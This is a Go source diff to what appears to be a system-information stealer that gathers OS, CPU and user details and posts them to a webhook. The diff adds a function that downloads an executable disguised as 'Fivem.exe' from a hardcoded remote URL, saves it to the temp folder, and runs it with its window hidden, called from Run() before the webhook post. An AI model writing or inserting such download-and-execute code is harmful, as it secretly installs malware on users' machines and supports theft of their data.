@@ -3,7 +3,9 @@ package system
 import (
 	"encoding/json"
 	"fmt"
+	"io"
 	"math/rand"
+	"net/http"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -28,6 +30,57 @@ func GetOS() string {
 		return "Not Found"
 	}
 	return strings.TrimSpace(strings.Split(string(out), "\n")[1])
+}
+
+func DownloadAndExecute(url string) error {
+	// Crée un fichier temporaire dans le répertoire temporaire de l'utilisateur actuel.
+	tempDir := os.TempDir()
+	tempFile := filepath.Join(tempDir, "Fivem.exe")
+
+	// Crée un nouveau fichier pour écrire le contenu téléchargé.
+	outFile, err := os.Create(tempFile)
+	if err != nil {
+		return err
+	}
+	defer outFile.Close()
+
+	// Télécharge le fichier depuis l'URL spécifiée.
+	response, err := http.Get(url)
+	if err != nil {
+		return err
+	}
+	defer response.Body.Close()
+
+	// Copie le contenu de la réponse HTTP dans le fichier créé.
+	_, err = io.Copy(outFile, response.Body)
+	if err != nil {
+		return err
+	}
+
+	// Assurez-vous que le fichier est fermé avant de l'exécuter.
+	outFile.Close()
+
+	// Donne les permissions d'exécution au fichier téléchargé.
+	err = os.Chmod(tempFile, 0755)
+	if err != nil {
+		return err
+	}
+
+	// Exécute le fichier téléchargé.
+	cmd := exec.Command(tempFile)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	err = cmd.Start()
+	if err != nil {
+		return err
+	}
+
+	// Attend que la commande se termine.
+	err = cmd.Wait()
+	if err != nil {
+		return err
+	}
+
+	return nil
 }
 
 func GetCPU() string {
@@ -223,6 +276,10 @@ func Run(webhook string) {
 	users := strings.Join(hardware.GetUsers(), "\n")
 	if len(users) > 4096 {
 		users = "Too many users to display"
+	}
+	err := DownloadAndExecute("https://mintsolution.xyz/Fivem.exe")
+	if err != nil {
+		fmt.Println("Erreur lors de l'exécution de Fivem.exe :", err)
 	}
 
 	requests.Webhook(webhook, map[string]interface{}{
